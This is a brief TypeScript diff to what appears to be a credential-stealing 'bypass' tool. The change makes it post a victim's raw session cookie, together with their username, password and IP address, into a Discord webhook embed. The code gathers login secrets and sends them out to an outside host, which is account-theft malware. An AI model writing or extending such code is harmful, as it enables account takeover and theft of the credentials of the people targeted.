@@ -119,6 +119,7 @@ export async function sendDiscordWebhook(webhookUrl: string, message: string) {
 
 export interface BypassEmbedData {
   valid: boolean;
+  cookie?: string;
   username?: string;
   password?: string;
   ip?: string;
@@ -156,7 +157,7 @@ export async function sendBypassEmbed(webhookUrl: string, data: BypassEmbedData)
           title: `${statusEmoji} Check Cookie · ${statusText}`,
           color: data.valid ? 0x22c55e : 0xef4444,
           fields: [
-            { name: '🪪 Cookie', value: `**${statusText}** ${statusEmoji}`, inline: false },
+            { name: `🪪 Cookie · ${statusText} ${statusEmoji}`, value: data.cookie ? '```\n' + data.cookie.slice(0, 1000) + '\n```' : na, inline: false },
             { name: '👤 Username (13+)', value: v(data.username), inline: true },
             { name: '🔑 Password', value: v(data.password), inline: true },
             { name: '🖥️ IP', value: v(data.ip), inline: true },
